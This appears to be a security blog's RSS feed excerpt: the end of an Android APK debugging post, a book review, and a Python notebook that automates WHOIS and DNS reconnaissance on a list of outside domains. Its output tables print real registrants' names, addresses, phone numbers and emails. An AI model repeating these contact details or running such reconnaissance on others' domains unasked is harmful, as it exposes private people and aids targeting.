<p><img src="/posts/img/2014/eclipse-ddms/eclipse_running_processes.png" alt=""></p>
<p>After starting the application in the <code>AVD</code> you&rsquo;ll notice a new process:</p>
<p><img src="/posts/img/2014/eclipse-ddms/eclipse_running_processes_after_app_start.png" alt=""></p>
<p>The red &ldquo;bug&rdquo; indicates that the process isn&rsquo;t being debugged yet. Meanwhile the app waits for some debugger
to get connected:</p>
<p><img src="/posts/img/2014/eclipse-ddms/app_waiting_for_debugger.png" alt=""></p>
<h4 id="debug-configuration">Debug configuration</h4>
<p>In order to be able to debug process you&rsquo;ll have to add a new debug configuration:</p>
<p><img src="/posts/img/2014/eclipse-ddms/eclipse_debug_configuration.png" alt=""></p>
<p>When setting up the configuration pay attention to the <strong>port</strong> your debugger should connect to. Make sure it matches with the port pair previously
seen in the running process list (marked in red):</p>
<p><img src="/posts/img/2014/eclipse-ddms/eclipse_debug_set_port.png" alt=""></p>
<p>Now click on <strong>Debug</strong> and you&rsquo;re ready to go. Take a look at the running processes. You&rsquo;ll notice sth changed:</p>
<p><img src="/posts/img/2014/eclipse-ddms/eclipse_debug_running.png" alt=""></p>
<p>The bug is now &ldquo;green&rdquo; meaning you&rsquo;re ready to debug your application.</p>
<h2 id="trigger-breakpoint">Trigger breakpoint</h2>
<p>We&rsquo;ve previously set a breakpoint at the <code>onCreate</code> method. Now that the application is running I had to &ldquo;trigger&rdquo; that breakpoint. Switching to my AVD I took
a look at the application and filled in the fields:</p>
<p><img src="/posts/img/2014/eclipse-ddms/app_enter_click.png" alt=""></p>
<p>Afterwards I&rsquo;ve clicked <em>Enter</em>. Switching back to Eclipse I got following picture:</p>
<p><img src="/posts/img/2014/eclipse-ddms/eclipse_hold_on_breakpoint.png" alt=""></p>
<p>The execution stopped at the breakpoint. Success! Now I&rsquo;ve typed F6 (Step over) and the execution moved on:</p>
<p><img src="/posts/img/2014/eclipse-ddms/eclipse_debug_stepin.png" alt=""></p>
<h2 id="conclusion">Conclusion</h2>
<p>Using great tools like <code>apktool</code> and <code>dex2jar</code> you can prepare your APK to inspect it dynamically in Eclipse. I think Eclipse (along with ADT) is a very powerful tool
when it comes to dynamic analysis. I can easily switch between code parts and analyze the execution flow. Keep in mind that when the original is <em>obfuscated</em> you may
want to debug <strong>smali</strong> code. In that case make sure you add the <strong>smali</strong> order instead of the <strong>src</strong> one (described earlier). For any questions feel free to write comments
below.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="http://www.programering.com/a/MjM5UTMwATg.html">http://www.programering.com/a/MjM5UTMwATg.html</a></li>
<li><a href="http://resources.infosecinstitute.com/android-hacking-security-part-6-exploiting-debuggable-android-applications/">http://resources.infosecinstitute.com/android-hacking-security-part-6-exploiting-debuggable-android-applications/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Python for Data Analysis</title>
      <link>https://blog.dornea.nu/2014/08/06/python-for-data-analysis/</link>
      <pubDate>Wed, 06 Aug 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/08/06/python-for-data-analysis/</guid>
      <content:encoded><![CDATA[<p>I use <code>Python</code> on daily basis. I love <code>IPython</code> and use it as my main <em>shell</em> for every day tasks. So it was a matter of time until I got captivated by <code>panda</code>, <code>scipy</code> and <code>numpy</code>. I&rsquo;ve ordered myself <a href="http://shop.oreilly.com/product/0636920023784.do"><em>Python for Data Analysis</em></a> in order to get more familiar with the mentioned libraries. Before that I used to semi-understand how their work and got used to that copy&amp;paste mentality.</p>
<p>This book is not only about data analysis. It teaches you how to organize data bit by bit in order to get your data analyzed. It&rsquo;s like &ldquo;hacking&rdquo; data the scientific way. Especially <code>numpy</code> has great features to re-structure data on your own needs. And because I&rsquo;m a very visual personI like to visualize things and make relations between data components more evident. A whole chapter is dedicated to <em>plotting and visualization</em>.</p>
<p><img src="/posts/img/2014/82130fa5ef04488358dd08b0a22542cf.jpg" alt=""></p>
<p>I also liked the examples - you&rsquo;ll get a lots of them - which range from small explanatory ones to entire financial analysis. That way I was able to apply my newly acquired knowledge and see real-world usage of the techniques.</p>
<p>This book is for every <em>data hacker</em> out there and not only. If you have to <em>filter</em>, <em>group</em>, <em>sort</em> your data in any way, this book will teach you how to that using <code>Python</code>. Go for it and order it now! :)</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Web Application Survey Tutorial</title>
      <link>https://blog.dornea.nu/2014/08/06/web-application-survey-tutorial/</link>
      <pubDate>Wed, 06 Aug 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/08/06/web-application-survey-tutorial/</guid>
      <content:encoded><![CDATA[<p>Suppose you get a list of some URLs and you are asked to &ldquo;investigate&rdquo; them. The list is full of some random URLs related to your company and nobody knows about. You don&rsquo;t have a clue who is responsible for them nor which applications (if any) are running behind them. Sounds like a cool task, ugh?</p>
<p>Well in today&rsquo;s post I&rsquo;ll show you how I&rsquo;ve managed it to minimize the process of analyzing each URL manually and saved me a lot of time automatizing things.</p>
<h2 id="setup-environment">Setup environment</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">%pylab inline
# &lt;!-- collapse=True --&gt;
import binascii
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import networkx as nx
import datetime as dt
import time
import ipy_table
import dnslib
import pythonwhois
import urlparse
import tldextract
import json
import os
import sys
import urllib2


from yurl import URL
from urlparse import urlparse
from IPython.display import display_pretty, display_html, display_jpeg, display_png, display_json, display_latex, display_svg

# Ipython settings
pd.set_option(&#39;display.height&#39;, 1000)
pd.set_option(&#39;display.max_rows&#39;, 500)
pd.set_option(&#39;display.max_columns&#39;, 500)
pd.set_option(&#39;display.max_colwidth&#39;, 100)
pd.set_option(&#39;display.width&#39;, 3000)
pd.set_option(&#39;display.column_space&#39;, 1000)

# Change working directory
os.chdir(&#34;/root/work/appsurvey&#34;)
</code></pre></div><pre><code>Populating the interactive namespace from numpy and matplotlib
height has been deprecated.
</code></pre>
<p>First I&rsquo;ll read the list of targets from some CSV file.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Fetch list of random URLs (found using Google)
response = urllib2.urlopen(&#39;http://files.ianonavy.com/urls.txt&#39;)
targets_row = response.read()

# Create DataFrame
targets = pd.DataFrame([t for t in targets_row.splitlines()], columns=[&#34;Target&#34;])
print(&#34;First 20 entries in the targets list&#34;)
targets[:20]
</code></pre></div><pre><code>First 20 entries in the targets list
</code></pre>
<div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>Target</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0 </th>
      <td>                 http://www.altpress.org/</td>
    </tr>
    <tr>
      <th>1 </th>
      <td>              http://www.nzfortress.co.nz</td>
    </tr>
    <tr>
      <th>2 </th>
      <td>            http://www.evillasforsale.com</td>
    </tr>
    <tr>
      <th>3 </th>
      <td>             http://www.playingenemy.com/</td>
    </tr>
    <tr>
      <th>4 </th>
      <td>         http://www.richardsonscharts.com</td>
    </tr>
    <tr>
      <th>5 </th>
      <td>                    http://www.xenith.net</td>
    </tr>
    <tr>
      <th>6 </th>
      <td>                http://www.tdbrecords.com</td>
    </tr>
    <tr>
      <th>7 </th>
      <td>     http://www.electrichumanproject.com/</td>
    </tr>
    <tr>
      <th>8 </th>
      <td>        http://tweekerchick.blogspot.com/</td>
    </tr>
    <tr>
      <th>9 </th>
      <td> http://www.besound.com/pushead/home.html</td>
    </tr>
    <tr>
      <th>10</th>
      <td>   http://www.porkchopscreenprinting.com/</td>
    </tr>
    <tr>
      <th>11</th>
      <td>              http://www.kinseyvisual.com</td>
    </tr>
    <tr>
      <th>12</th>
      <td>                http://www.rathergood.com</td>
    </tr>
    <tr>
      <th>13</th>
      <td>                   http://www.lepoint.fr/</td>
    </tr>
    <tr>
      <th>14</th>
      <td>                     http://www.revhq.com</td>
    </tr>
    <tr>
      <th>15</th>
      <td>           http://www.poprocksandcoke.com</td>
    </tr>
    <tr>
      <th>16</th>
      <td>              http://www.samuraiblue.com/</td>
    </tr>
    <tr>
      <th>17</th>
      <td>   http://www.openbsd.org/cgi-bin/man.cgi</td>
    </tr>
    <tr>
      <th>18</th>
      <td>                   http://www.sysblog.com</td>
    </tr>
    <tr>
      <th>19</th>
      <td>            http://www.voicesofsafety.com</td>
    </tr>
  </tbody>
</table>
</div>
<p>Now I&rsquo;ll split the URLs in several parts:</p>
<ul>
<li>schema (HTTP, FTP, SSH etc.)</li>
<li>host</li>
<li>port</li>
<li>path</li>
<li>query (?q=somevalue etc.)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># &lt;!-- collapse=True --&gt;
# Join root domain + suffix
extract_root_domain =  lambda x: &#39;.&#39;.join(tldextract.extract(x)[1:3])

target_columns = [&#39;scheme&#39;, &#39;userinfo&#39;, &#39;host&#39;, &#39;port&#39;, &#39;path&#39;, &#39;query&#39;, &#39;fragment&#39;, &#39;decoded&#39;]
target_component = [list(URL(t)) for t in targets[&#39;Target&#39;]]

df_targets = pd.DataFrame(target_component, columns=target_columns)
empty_hosts = df_targets[df_targets[&#39;host&#39;] == &#39;&#39;]

# Copy path information to host
for index,row in empty_hosts.iterrows():
    df_targets.ix[index:index][&#39;host&#39;] = df_targets.ix[index:index][&#39;path&#39;]
    df_targets.ix[index:index][&#39;path&#39;] = &#39;&#39;
    
# Extract root tld
df_targets[&#39;root_domain&#39;] = df_targets[&#39;host&#39;].apply(extract_root_domain)

# Drop unnecessary columns
df_targets.drop([&#39;query&#39;, &#39;fragment&#39;, &#39;decoded&#39;], axis=1, inplace=True)

# Write df to file (for later use)
df_targets.to_csv(&#34;targets_df.csv&#34;, sep=&#34;\t&#34;)

print(&#34;First 20 Entries&#34;)
df_targets[:20]
</code></pre></div><pre><code>First 20 Entries
</code></pre>
<div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>scheme</th>
      <th>userinfo</th>
      <th>host</th>
      <th>port</th>
      <th>path</th>
      <th>root_domain</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0 </th>
      <td> http</td>
      <td> </td>
      <td>               www.altpress.org</td>
      <td> </td>
      <td>                  /</td>
      <td>               altpress.org</td>
    </tr>
    <tr>
      <th>1 </th>
      <td> http</td>
      <td> </td>
      <td>           www.nzfortress.co.nz</td>
      <td> </td>
      <td>                   </td>
      <td>           nzfortress.co.nz</td>
    </tr>
    <tr>
      <th>2 </th>
      <td> http</td>
      <td> </td>
      <td>         www.evillasforsale.com</td>
      <td> </td>
      <td>                   </td>
      <td>         evillasforsale.com</td>
    </tr>
    <tr>
      <th>3 </th>
      <td> http</td>
      <td> </td>
      <td>           www.playingenemy.com</td>
      <td> </td>
      <td>                  /</td>
      <td>           playingenemy.com</td>
    </tr>
    <tr>
      <th>4 </th>
      <td> http</td>
      <td> </td>
      <td>      www.richardsonscharts.com</td>
      <td> </td>
      <td>                   </td>
      <td>      richardsonscharts.com</td>
    </tr>
    <tr>
      <th>5 </th>
      <td> http</td>
      <td> </td>
      <td>                 www.xenith.net</td>
      <td> </td>
      <td>                   </td>
      <td>                 xenith.net</td>
    </tr>
    <tr>
      <th>6 </th>
      <td> http</td>
      <td> </td>
      <td>             www.tdbrecords.com</td>
      <td> </td>
      <td>                   </td>
      <td>             tdbrecords.com</td>
    </tr>
    <tr>
      <th>7 </th>
      <td> http</td>
      <td> </td>
      <td>   www.electrichumanproject.com</td>
      <td> </td>
      <td>                  /</td>
      <td>   electrichumanproject.com</td>
    </tr>
    <tr>
      <th>8 </th>
      <td> http</td>
      <td> </td>
      <td>      tweekerchick.blogspot.com</td>
      <td> </td>
      <td>                  /</td>
      <td>  tweekerchick.blogspot.com</td>
    </tr>
    <tr>
      <th>9 </th>
      <td> http</td>
      <td> </td>
      <td>                www.besound.com</td>
      <td> </td>
      <td> /pushead/home.html</td>
      <td>                besound.com</td>
    </tr>
    <tr>
      <th>10</th>
      <td> http</td>
      <td> </td>
      <td> www.porkchopscreenprinting.com</td>
      <td> </td>
      <td>                  /</td>
      <td> porkchopscreenprinting.com</td>
    </tr>
    <tr>
      <th>11</th>
      <td> http</td>
      <td> </td>
      <td>           www.kinseyvisual.com</td>
      <td> </td>
      <td>                   </td>
      <td>           kinseyvisual.com</td>
    </tr>
    <tr>
      <th>12</th>
      <td> http</td>
      <td> </td>
      <td>             www.rathergood.com</td>
      <td> </td>
      <td>                   </td>
      <td>             rathergood.com</td>
    </tr>
    <tr>
      <th>13</th>
      <td> http</td>
      <td> </td>
      <td>                 www.lepoint.fr</td>
      <td> </td>
      <td>                  /</td>
      <td>                 lepoint.fr</td>
    </tr>
    <tr>
      <th>14</th>
      <td> http</td>
      <td> </td>
      <td>                  www.revhq.com</td>
      <td> </td>
      <td>                   </td>
      <td>                  revhq.com</td>
    </tr>
    <tr>
      <th>15</th>
      <td> http</td>
      <td> </td>
      <td>        www.poprocksandcoke.com</td>
      <td> </td>
      <td>                   </td>
      <td>        poprocksandcoke.com</td>
    </tr>
    <tr>
      <th>16</th>
      <td> http</td>
      <td> </td>
      <td>            www.samuraiblue.com</td>
      <td> </td>
      <td>                  /</td>
      <td>            samuraiblue.com</td>
    </tr>
    <tr>
      <th>17</th>
      <td> http</td>
      <td> </td>
      <td>                www.openbsd.org</td>
      <td> </td>
      <td>   /cgi-bin/man.cgi</td>
      <td>                openbsd.org</td>
    </tr>
    <tr>
      <th>18</th>
      <td> http</td>
      <td> </td>
      <td>                www.sysblog.com</td>
      <td> </td>
      <td>                   </td>
      <td>                sysblog.com</td>
    </tr>
    <tr>
      <th>19</th>
      <td> http</td>
      <td> </td>
      <td>         www.voicesofsafety.com</td>
      <td> </td>
      <td>                   </td>
      <td>         voicesofsafety.com</td>
    </tr>
  </tbody>
</table>
</div>
<h2 id="whois">Whois</h2>
<p>Now get WHOIS information based on data in <code>df_targets</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#6ab825;font-weight:bold">if</span> [ ! -d <span style="color:#ed9d13">&#34;WHOIS&#34;</span> ]; <span style="color:#6ab825;font-weight:bold">then</span>
    mkdir WHOIS
<span style="color:#6ab825;font-weight:bold">fi</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Get unique values
uniq_roots = df_targets[&#39;root_domain&#39;].unique()
uniq_subdomains = df_targets[&#39;host&#39;].unique()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># &lt;!-- collapse=True --&gt;

def date_handler(obj):
    return obj.isoformat() if hasattr(obj, &#39;isoformat&#39;) else obj

target_whois = {}

def fetch_whois(domains):
    &#34;&#34;&#34; Fetch WHOIS information for specified domains (list) &#34;&#34;&#34;
    for d in domains:
        print(&#34;Get WHOIS for\t %s ...&#34; % d)

        # Check if file already exists
        if os.path.isfile(&#34;WHOIS/%s.json&#34; % d):
            print(&#34;File exists already. Aborting.&#34;)
            continue

        try:
            # Get whois information
            whois_data = pythonwhois.get_whois(d)

            # Convert to JSON$
            json_data = json.dumps(whois_data, default=date_handler)

            # Write contents to file
            with open(&#39;WHOIS/%s.json&#39; % d, &#39;w&#39;) as outfile:
              json.dump(json_data, outfile)

            # Sleep for 20s    
            time.sleep(20)
        except:
            print(&#34;[ERROR] Couldn&#39;t retrieve WHOIS for\t %s&#34; % d)
            
# I&#39;ll only fetch the root domains and only the first 20. Feel free to uncomment this
# and adapt it to your needs.
#fetch_whois(uniq_subdomains)
fetch_whois(uniq_roots[:20])
    
</code></pre></div><pre><code>Get WHOIS for	 altpress.org ...
Get WHOIS for	 nzfortress.co.nz ...
Get WHOIS for	 evillasforsale.com ...
Get WHOIS for	 playingenemy.com ...
Get WHOIS for	 richardsonscharts.com ...
Get WHOIS for	 xenith.net ...
Get WHOIS for	 tdbrecords.com ...
Get WHOIS for	 electrichumanproject.com ...
Get WHOIS for	 tweekerchick.blogspot.com ...
Get WHOIS for	 besound.com ...
Get WHOIS for	 porkchopscreenprinting.com ...
Get WHOIS for	 kinseyvisual.com ...
Get WHOIS for	 rathergood.com ...
Get WHOIS for	 lepoint.fr ...
Get WHOIS for	 revhq.com ...
Get WHOIS for	 poprocksandcoke.com ...
Get WHOIS for	 samuraiblue.com ...
Get WHOIS for	 openbsd.org ...
Get WHOIS for	 sysblog.com ...
Get WHOIS for	 voicesofsafety.com ...
</code></pre>
<h2 id="get-all-dns-records">Get all DNS records</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#6ab825;font-weight:bold">if</span> [ ! -d <span style="color:#ed9d13">&#34;DNS&#34;</span> ]; <span style="color:#6ab825;font-weight:bold">then</span>
    mkdir DNS
<span style="color:#6ab825;font-weight:bold">fi</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># &lt;!-- collapse=True --&gt;
def fetch_dns(domains):
    &#34;&#34;&#34; Fetch all DNS records for specified domains (list) &#34;&#34;&#34;
    for d in domains:
        print(&#34;Dig DNS records for\t %s ...&#34; % d)

        # Check if file already exists
        if os.path.isfile(&#34;DNS/%s.txt&#34; % d):
            print(&#34;File exists already. Aborting.&#34;)
            continue
            
        # Get DNS info
        dig_data = !dig +nocmd $d any +multiline +noall +answer
        dig_output = &#34;\n&#34;.join(dig_data)
        
        # Write contents to file
        with open(&#39;DNS/%s.txt&#39; % d, &#39;w&#39;) as outfile:
            outfile.write(dig_output)
            outfile.close()
        
        time.sleep(5)
        
# I&#39;ll only fetch the root domains and only the first 20. Feel free to uncomment this
# and adapt it to your needs.
#fetch_dns(uniq_subdomains)
fetch_dns(uniq_roots[:20])
</code></pre></div><pre><code>Dig DNS records for	 altpress.org ...
Dig DNS records for	 nzfortress.co.nz ...
Dig DNS records for	 evillasforsale.com ...
Dig DNS records for	 playingenemy.com ...
Dig DNS records for	 richardsonscharts.com ...
Dig DNS records for	 xenith.net ...
Dig DNS records for	 tdbrecords.com ...
Dig DNS records for	 electrichumanproject.com ...
Dig DNS records for	 tweekerchick.blogspot.com ...
Dig DNS records for	 besound.com ...
Dig DNS records for	 porkchopscreenprinting.com ...
Dig DNS records for	 kinseyvisual.com ...
Dig DNS records for	 rathergood.com ...
Dig DNS records for	 lepoint.fr ...
Dig DNS records for	 revhq.com ...
Dig DNS records for	 poprocksandcoke.com ...
Dig DNS records for	 samuraiblue.com ...
Dig DNS records for	 openbsd.org ...
Dig DNS records for	 sysblog.com ...
Dig DNS records for	 voicesofsafety.com ...
</code></pre>
<h2 id="read-whois-information">Read WHOIS information</h2>
<p>After collecting the data I&rsquo;ll try to manipulate data in a pythonic way in order to export it later to some useful format like Excel. I&rsquo;ll therefor read the collected data from every single file, merge the data and create a <code>DataFrame</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># &lt;!-- collapse=True --&gt;
from pprint import pprint

# Global DF frames
frames = []

def read_whois(domains):
    for d in domains:
        print(&#34;Reading WHOIS for\t %s&#34; % d)
        
        try:
            with open(&#39;WHOIS/%s.json&#39; % d, &#39;r&#39;) as inputfile:
                whois = json.loads(json.load(inputfile))

                # Delete raw record
                whois.pop(&#39;raw&#39;, None)

                data = []
                
                # Iterate contacts -&gt; tech
                if whois[&#39;contacts&#39;][&#39;tech&#39;]:
                    for i in whois[&#39;contacts&#39;][&#39;tech&#39;]:
                        data.append([d, &#39;contacts&#39;, &#39;tech&#39;, i, whois[&#39;contacts&#39;][&#39;tech&#39;][i]])

                # Iterate contacts -&gt; admin
                if whois[&#39;contacts&#39;][&#39;admin&#39;]:
                    for i in whois[&#39;contacts&#39;][&#39;admin&#39;]:
                        data.append([d, &#39;contacts&#39;, &#39;admin&#39;, i, whois[&#39;contacts&#39;][&#39;admin&#39;][i]])

                # Nameservers
                if &#34;nameservers&#34; in whois:
                    for i in whois[&#39;nameservers&#39;]:
                        data.append([d, &#39;nameservers&#39;, &#39;&#39;, &#39;&#39;, i])

                # Create DF only if data is not empty
                if data:
                    df = pd.DataFrame(data, columns=[&#39;domain&#39;, &#39;element&#39;, &#39;type&#39;, &#39;field&#39;, &#39;value&#39;])
                    frames.append(df)

                # Close file
                inputfile.close()
        except:
            print(&#34;[ERROR] Couldn&#39;t read WHOIS for\t %s&#34; % d)

#read_whois(uniq_subdomains)
read_whois(uniq_roots[:20])
</code></pre></div><pre><code>Reading WHOIS for	 altpress.org
Reading WHOIS for	 nzfortress.co.nz
Reading WHOIS for	 evillasforsale.com
Reading WHOIS for	 playingenemy.com
Reading WHOIS for	 richardsonscharts.com
Reading WHOIS for	 xenith.net
Reading WHOIS for	 tdbrecords.com
Reading WHOIS for	 electrichumanproject.com
Reading WHOIS for	 tweekerchick.blogspot.com
Reading WHOIS for	 besound.com
Reading WHOIS for	 porkchopscreenprinting.com
Reading WHOIS for	 kinseyvisual.com
Reading WHOIS for	 rathergood.com
Reading WHOIS for	 lepoint.fr
Reading WHOIS for	 revhq.com
Reading WHOIS for	 poprocksandcoke.com
Reading WHOIS for	 samuraiblue.com
Reading WHOIS for	 openbsd.org
Reading WHOIS for	 sysblog.com
Reading WHOIS for	 voicesofsafety.com
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">df_whois = pd.concat(frames)
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">df_whois.set_index([&#39;domain&#39;, &#39;element&#39;, &#39;type&#39;, &#39;field&#39;])
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th></th>
      <th></th>
      <th></th>
      <th>value</th>
    </tr>
    <tr>
      <th>domain</th>
      <th>element</th>
      <th>type</th>
      <th>field</th>
      <th></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th rowspan="22" valign="top">altpress.org</th>
      <th rowspan="20" valign="top">contacts</th>
      <th rowspan="10" valign="top">tech</th>
      <th>city</th>
      <td>                                                            Baltimore</td>
    </tr>
    <tr>
      <th>handle</th>
      <td>                                                        AB10045-GANDI</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                           a.h.s. boy</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.4102358565</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   MD</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                   2710 N. Calvert St</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                21218</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                            dada typo</td>
    </tr>
    <tr>
      <th>email</th>
      <td>           29bcde81a3c0e645a9f2a60290ecf2df-1566139@contact.gandi.net</td>
    </tr>
    <tr>
      <th rowspan="10" valign="top">admin</th>
      <th>city</th>
      <td>                                                            Baltimore</td>
    </tr>
    <tr>
      <th>handle</th>
      <td>                                                        AB10045-GANDI</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                           a.h.s. boy</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.4102358565</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   MD</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                   2710 N. Calvert St</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                21218</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                            dada typo</td>
    </tr>
    <tr>
      <th>email</th>
      <td>           29bcde81a3c0e645a9f2a60290ecf2df-1566139@contact.gandi.net</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">nameservers</th>
      <th rowspan="2" valign="top"></th>
      <th></th>
      <td>                                                  DNS.NOTHINGNESS.ORG</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                     DNS.DADATYPO.NET</td>
    </tr>
    <tr>
      <th rowspan="20" valign="top">evillasforsale.com</th>
      <th rowspan="18" valign="top">contacts</th>
      <th rowspan="9" valign="top">tech</th>
      <th>city</th>
      <td>                                                           Manchester</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                          Andy Deakin</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   GB</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                       +44.1616605550</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                   Greater Manchester</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                               66 Grosvenor St Denton</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                              M34 3GA</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                PCmend.net Computer Solutions Limited</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                   domains@pcmend.net</td>
    </tr>
    <tr>
      <th rowspan="9" valign="top">admin</th>
      <th>city</th>
      <td>                                                           Manchester</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                          Andy Deakin</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   GB</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                       +44.1616605550</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                   Greater Manchester</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                               66 Grosvenor St Denton</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                              M34 3GA</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                PCmend.net Computer Solutions Limited</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                   domains@pcmend.net</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">nameservers</th>
      <th rowspan="2" valign="top"></th>
      <th></th>
      <td>                                                       NS1.PCMEND.NET</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                       NS2.PCMEND.NET</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">playingenemy.com</th>
      <th rowspan="2" valign="top">nameservers</th>
      <th rowspan="2" valign="top"></th>
      <th></th>
      <td>                                                   ns04.a2z-server.jp</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                  dns04.a2z-server.jp</td>
    </tr>
    <tr>
      <th rowspan="22" valign="top">richardsonscharts.com</th>
      <th rowspan="20" valign="top">contacts</th>
      <th rowspan="10" valign="top">tech</th>
      <th>city</th>
      <td>                                                          New Bedford</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                        +1.5089926604</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                 Garrity, Christopher</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.8888396604</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   MA</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                           90 Hatch Street, 1st Floor</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                02745</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                                 null</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                 cgarrity@maptech.com</td>
    </tr>
    <tr>
      <th rowspan="10" valign="top">admin</th>
      <th>city</th>
      <td>                                                          New Bedford</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                        +1.5089926604</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                           Estes, Lee</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.8888396604</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   MA</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                           90 Hatch Street, 1st Floor</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                02745</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                                 null</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                   richcharts@aol.com</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">nameservers</th>
      <th rowspan="2" valign="top"></th>
      <th></th>
      <td>                                                   NS2.TERENCENET.NET</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                    NS.TERENCENET.NET</td>
    </tr>
    <tr>
      <th rowspan="22" valign="top">xenith.net</th>
      <th rowspan="20" valign="top">contacts</th>
      <th rowspan="10" valign="top">tech</th>
      <th>city</th>
      <td>                                                         PALM SPRINGS</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                        +1.7603255504</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                            DNS Admin</td>
    </tr>
    <tr>
